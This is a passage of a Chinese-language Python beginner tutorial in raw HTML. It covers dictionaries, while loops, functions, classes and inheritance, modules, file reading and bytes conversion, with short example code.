class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tel = &#123;<span class="string">&#x27;jack&#x27;</span>:<span class="number">4098</span>,<span class="string">&#x27;space&#x27;</span>:<span class="number">4139</span>&#125;</span><br><span class="line">tel[<span class="string">&#x27;guido&#x27;</span>] = <span class="number">4127</span></span><br><span class="line">tel[<span class="string">&#x27;space&#x27;</span>] = <span class="number">4056</span></span><br><span class="line"><span class="built_in">print</span>(tel)<span class="comment">#打印字典</span></span><br><span class="line"><span class="built_in">print</span>(tel[<span class="string">&#x27;jack&#x27;</span>])<span class="comment">#访问字典的值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> tel[<span class="string">&#x27;space&#x27;</span>]<span class="comment">#删除键值space的字典</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(tel)) <span class="comment">#遍历字典键值</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;jack&#x27;</span> <span class="keyword">in</span> tel:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#通过get函数来避免报错</span></span><br><span class="line">test_key = tel.get(<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;no key&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(test_key)</span><br></pre></td></tr></table></figure><h3 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h3><p>一个Python字典可能只包含几个键值对，也可能包含数百万个键值对。鉴于字典可能包含大量数据，Python支持对字典进行遍历。字典可用于以各种方式存储信息，因此有多种遍历方式：可遍历字典的<code>所有键值对</code>，<code>也可仅遍历键或值</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">knights = &#123;<span class="string">&#x27;gallahad&#x27;</span>: <span class="string">&#x27;the pure&#x27;</span>, <span class="string">&#x27;robin&#x27;</span>: <span class="string">&#x27;the brave&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> knights.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nKey:<span class="subst">&#123;k&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nValue:<span class="subst">&#123;v&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#遍历所有键 Key</span></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> knights.keys():</span><br><span class="line">    <span class="built_in">print</span>(key.title())</span><br><span class="line"><span class="comment">#遍历所有值 Value</span></span><br><span class="line"><span class="keyword">for</span> knight <span class="keyword">in</span> knights.values():</span><br><span class="line">    <span class="built_in">print</span>(knight.title())</span><br><span class="line">      </span><br><span class="line"><span class="comment">#按照顺序遍历</span></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">sorted</span>(knights.keys()):</span><br><span class="line">    <span class="built_in">print</span>(key.title())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="While循环"><a href="#While循环" class="headerlink" title="While循环"></a>While循环</h2><p>for循环用于针对集合中的每个元素都执行一个代码块，而While循环则不断运行，<code>直到指定的条件不满足为止。</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">current_number = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> current_number &lt;= <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(current_number)</span><br><span class="line">    current_number += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>让用户来选择何时退出！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;\nTell me something, and I will repeat it back to you:&quot;</span></span><br><span class="line">msg += <span class="string">&quot;\nEnter &#x27;quit&#x27; to end the program. &quot;</span></span><br><span class="line">message = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> message != <span class="string">&#x27;quit&#x27;</span>:</span><br><span class="line">    message = <span class="built_in">input</span>(msg)</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure><p>用While循环处理列表和字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建一个待验证用户列表</span></span><br><span class="line">unconfirmed_users = [<span class="string">&#x27;alice&#x27;</span>,<span class="string">&#x27;brian&#x27;</span>,<span class="string">&#x27;candace&#x27;</span>]</span><br><span class="line"><span class="comment">#用来存储已验证的用户列表</span></span><br><span class="line">confirmed_users = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> unconfirmed_users:</span><br><span class="line">    current_user = unconfirmed_users.pop()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Verifying  user:<span class="subst">&#123;current_user.title()&#125;</span>&quot;</span>)</span><br><span class="line">    confirmed_users.append(current_user)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#显示所有已经验证过的用户</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nThe following users have been confirmed:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> confirmed_user <span class="keyword">in</span> confirmed_users:</span><br><span class="line">    <span class="built_in">print</span>(confirmed_user.title())</span><br></pre></td></tr></table></figure><h2 id="def-函数"><a href="#def-函数" class="headerlink" title="def 函数"></a>def 函数</h2><h3 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h3><p>使用关键字<code>def</code>来告诉Python，你要<code>定义一个函数</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greet_user</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;显示简单的问候语&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello!&quot;</span>)</span><br><span class="line"></span><br><span class="line">greet_user()</span><br></pre></td></tr></table></figure><h3 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greet_user</span>(<span class="params">username</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;像谁问好&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Hello! <span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">greet_user(<span class="string">&quot;Hacker!&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="形参和实参"><a href="#形参和实参" class="headerlink" title="形参和实参"></a>形参和实参</h3><p>在函数greet_user()的定义中，变量<code>username是一个形参</code>（parameter），即函数完成工作所需的信息。在代码greet_user(‘jesse’)中，<code>值&#39;jesse&#39;是一个实参</code>（argument）</p><p>调用函数时，Python<code>必须将函数调用中的每个实参都关联到函数定义中的一个形参</code>。为此，最简单的关联方式是<code>基于实参的顺序</code>。这种关联方式称为位置实参。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">describe_pet</span>(<span class="params">animal_type,pet_name</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;显示宠物的信息.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nI have a <span class="subst">&#123;animal_type&#125;</span>.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;My <span class="subst">&#123;animal_type&#125;</span>&#x27;s name is <span class="subst">&#123;pet_name.title()&#125;</span>&#x27;.&quot;</span>)</span><br><span class="line">    </span><br><span class="line">describe_pet(<span class="string">&#x27;hamster&#x27;</span>,<span class="string">&#x27;harry&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="关键字实参"><a href="#关键字实参" class="headerlink" title="关键字实参"></a>关键字实参</h3><p>关键字实参是传递给函数的名称值对。因为直接在实参中将名称和值关联起来，所以向函数传递实参时不会混淆。关键字实参的顺序无关紧要.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">describe_pet</span>(<span class="params">animal_type,pet_name</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;显示宠物的信息。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nI have a <span class="subst">&#123;animal_type&#125;</span>.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;My <span class="subst">&#123;animal_type&#125;</span>&#x27;s name is <span class="subst">&#123;pet_name.title()&#125;</span>.&#x27;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">describe_pet(pet_name=<span class="string">&#x27;harry&#x27;</span>,animal_type=<span class="string">&#x27;hamster&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h3><p>编写函数时，可给每个形参指定默认值。这个在其他高级语言里面也有，就是定义函数的时候直接给形参赋值了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">describe_pet</span>(<span class="params">animal_type,pet_name=<span class="string">&#x27;dog&#x27;</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;显示宠物的信息。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nI have a <span class="subst">&#123;animal_type&#125;</span>.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;My <span class="subst">&#123;animal_type&#125;</span>&#x27;s name is <span class="subst">&#123;pet_name.title()&#125;</span>.&#x27;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">describe_pet(<span class="string">&#x27;willie&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>Python的函数的返回值和C++的不太一样，C++在定义函数的时候必须要明确的声明返回的是什么类型，而Python是根据return 关键字来判断你需要返回什么类型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(test()+<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h3 id="禁止函数修改列表"><a href="#禁止函数修改列表" class="headerlink" title="禁止函数修改列表"></a>禁止函数修改列表</h3><p>有时候，需要禁止函数修改列表，可向函数传递列表的副本而非原件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">function_name</span>(<span class="params">list_name[:]</span>):</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h2 id="class-类"><a href="#class-类" class="headerlink" title="class 类"></a>class 类</h2><p>Python中和其他语言一样，用关键字<code>class</code>来定义一个类。</p><p><code>__init__</code>方法，这个类似C++中的<code>构造函数</code>，<code>self</code>类似C++中的<code>this指针</code>，python中声明定义熟悉直接在<code>__init__</code>中用self来定义.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟小狗的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,age</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化属性name和age,类似构造函数&quot;&quot;&quot;</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sit</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;模拟小狗收到命令时蹲下!&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name.title()&#125;</span> is now sittring.&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">roll_over</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;模拟小狗收到命令时打滚。&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name.title()&#125;</span> rolled over!&quot;</span>)</span><br><span class="line">        </span><br><span class="line">my_dog = Dog(<span class="string">&#x27;Willie&#x27;</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;My dog&#x27;s name is <span class="subst">&#123;my_dog.name&#125;</span>.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;My dog is <span class="subst">&#123;my_dog.age&#125;</span> years old.&quot;</span>)</span><br><span class="line">my_dog.sit()</span><br><span class="line">my_dog.roll_over()</span><br></pre></td></tr></table></figure><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>面向对象的灵魂三大要素:<code>封装</code>、<code>继承</code>、<code>多态</code>，所以在class中继承必不可少.</p><p>在python中，在既有类的基础上编写新类时，通常要调用父类的方法<code>__init__()</code>。这将初始化在父类<code>__init__()</code>方法中定义的所有属性，从而让子类包含这些属性.</p><p>子类继承父类的关键字：(父类)，在子类中可以用<code>super()</code>来调用父类的方法.</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">eat</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;eating....&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;running....&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sleep</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;sleeping....&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span>(<span class="params">Animal</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,age</span>):</span></span><br><span class="line">        self.tails = <span class="literal">True</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(name,age)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">roll_over</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;模拟小狗收到命令时打滚。&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name.title()&#125;</span> rolled over!&quot;</span>)</span><br><span class="line">        </span><br><span class="line">my_dog = Dog(<span class="string">&#x27;Willie&#x27;</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;My dog&#x27;s name is <span class="subst">&#123;my_dog.name&#125;</span>.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;My dog is <span class="subst">&#123;my_dog.age&#125;</span> years old.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;My dog&#x27;s tails is <span class="subst">&#123;my_dog.tails&#125;</span>.&quot;</span>)</span><br><span class="line"></span><br><span class="line">my_dog.eat()</span><br><span class="line">my_dog.run()</span><br><span class="line">my_dog.sleep()</span><br><span class="line">my_dog.roll_over()</span><br></pre></td></tr></table></figure><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>模块就是单独的一个类文件，将类写在了.py文件中.</p><p><code>car模块</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;一个用户表示汽车的类&quot;&quot;&quot;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的尝试。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,make,model,year</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性。&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_descriptive_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;返回整洁的描述性名称。&quot;&quot;&quot;</span></span><br><span class="line">        long_name = <span class="string">f&quot;<span class="subst">&#123;self.year&#125;</span> <span class="subst">&#123;self.make&#125;</span> <span class="subst">&#123;self.model&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_odometer</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;打印一条消息，指出汽车的里程。&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;This car has <span class="subst">&#123;self.odometer_reading&#125;</span> miles on it.&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update_odometer</span>(<span class="params">self,mileage</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        将里程表读数设置为指定的值。</span></span><br><span class="line"><span class="string">        拒绝将里程表往回调。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">            self.odometer_reading = mileage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">increment_odometer</span>(<span class="params">self,miles</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;将里程表读数增加指定的量&quot;&quot;&quot;</span></span><br><span class="line">        self.odometer_reading += miles</span><br></pre></td></tr></table></figure><p><code>my_car.py</code>代码</p><p>此处的<code>import</code>语句让python打开模块<code>car</code>并且导入其中的<code>Car</code>类，因为在一个模块中可能包含多个<code>类 class</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> car <span class="keyword">import</span> Car</span><br><span class="line"></span><br><span class="line">my_new_car = Car(<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;a4&#x27;</span>,<span class="number">2019</span>)</span><br><span class="line"><span class="built_in">print</span>(my_new_car.get_descriptive_name())</span><br><span class="line"></span><br><span class="line">my_new_car.odometer_reading = <span class="number">23</span></span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure><p>导入类是一种有效的编程方式。如果这个程序包含整个Class类，它该有多长啊！通过将这个类移到一个模块中并导入该模块，依然可以使用其所有功能，但主程序文件变得整洁而易于阅读了。这还让你能够将大部分逻辑存储在独立的文件中。确定类像你希望的那样工作后，就可以不管这些文件，而专注于主程序的高级逻辑了。</p><h3 id="导入模块中的多个类"><a href="#导入模块中的多个类" class="headerlink" title="导入模块中的多个类"></a>导入模块中的多个类</h3><p>利用逗号分隔，可以导入模块中的多个类。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> car <span class="keyword">import</span> Car,..,....</span><br></pre></td></tr></table></figure><h3 id="导入整个模块"><a href="#导入整个模块" class="headerlink" title="导入整个模块"></a>导入整个模块</h3><p>可以直接用import导入整个模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> car <span class="comment">#可以使用car模块中的所有类</span></span><br><span class="line">car.Car()<span class="comment">#使用Car类</span></span><br></pre></td></tr></table></figure><h3 id="导入模块中的所有类"><a href="#导入模块中的所有类" class="headerlink" title="导入模块中的所有类"></a>导入模块中的所有类</h3><p>不推荐这种做法，因为这种方式可能引发名称方面的迷惑，如果不小心导入了一个与程序文件中其他东西同名的类，将引发难以诊断的错误。</p><p>需要从一个模块中导入很多类时，最好<code>导入整个模块</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> module_name <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><h3 id="使用别名"><a href="#使用别名" class="headerlink" title="使用别名"></a>使用别名</h3><p>使用模块来组织项目代码时，别名大有裨益。导入类时，也可为其指定别名。</p><p>例如，要在程序中创建大量电动汽车实例，需要反复输入ElectricCar，非常烦琐。为避免这种烦恼，可在import语句中给ElectricCar指定一个别名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> electric_car <span class="keyword">import</span> ElectricCar <span class="keyword">as</span> EC</span><br></pre></td></tr></table></figure><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p>Python <code>open()</code> 函数用于打开一个文件，创建一个 <code>file</code> 对象，相关的方法才可以调用它进行读写。<br>和C语言中的差不多，前面是打开文件的路径，后面是打开文件的方式，<code>as</code>上面说过用来创建别名，那么file_object即使他的对象名。</p><p>显式地调用<code>close</code>关闭了这个文件句柄，但前提是只有在read成功的情况下。如果有任意异常正好在<code>f = open(...)</code>之后产生，<code>f.close()</code>将不会被调用（取决于Python解释器的做法，文件句柄可能还是会被归还，但那是另外的话题了）。为了确保不管异常是否触发，文件都能关闭，我们将其包裹成一个<code>with</code>语句:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;hello.txt&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    text = file_object.read()</span><br><span class="line"><span class="built_in">print</span>(text)</span><br></pre></td></tr></table></figure><h2 id="bytes类型和str互相转换"><a href="#bytes类型和str互相转换" class="headerlink" title="bytes类型和str互相转换"></a>bytes类型和str互相转换</h2><h3 id="bytes"><a href="#bytes" class="headerlink" title="bytes"></a>bytes</h3><p>Python中<code>bytes</code>表示<code>字节序列</code>(二进制形式)，是一个不可变的数据类型，对应的可变形式是bytearray，也就是字节数组。</p><p>可以通过字符串来创建 bytes 对象，或者说将字符串转换成 bytes 对象有以下三种方法可以达到这个目的：</p><ul><li>如果字符串的内容都是 ASCII 字符，那么直接在字符串前面添加<code>b</code>前缀就可以转换成 bytes。</li><li><code>bytes 是一个类</code>，调用它的构造方法，也就是 <code>bytes()</code>，可以将字符串按照指定的字符集转换成 bytes；如果不指定字符集，那么默认采用 UTF-8。</li><li>字符串本身有一个 <code>encode()</code> 方法，该方法专门用来将字符串按照指定的字符集转换成对应的字节串；如果不指定字符集，那么默认采用 UTF-8</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过构造函数创建空 bytes</span></span><br><span class="line">b1 = <span class="built_in">bytes</span>()</span><br><span class="line"><span class="comment">#通过空字符串创建空 bytes</span></span><br><span class="line">b2 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过b前缀将字符串转换成 bytes</span></span><br><span class="line">b3 = <span class="string">b&#x27;http://c.biancheng.net/python/&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b3: &quot;</span>, b3)</span><br><span class="line"><span class="built_in">print</span>(b3[<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(b3[<span class="number">7</span>:<span class="number">22</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#为 bytes() 方法指定字符集</span></span><br><span class="line">b4 = <span class="built_in">bytes</span>(<span class="string">&#x27;C语言中文网8岁了&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b4: &quot;</span>, b4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过 encode() 方法将字符串转换成 bytes</span></span><br><span class="line">b5 = <span class="string">&quot;C语言中文网8岁了&quot;</span>.encode(<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b5: 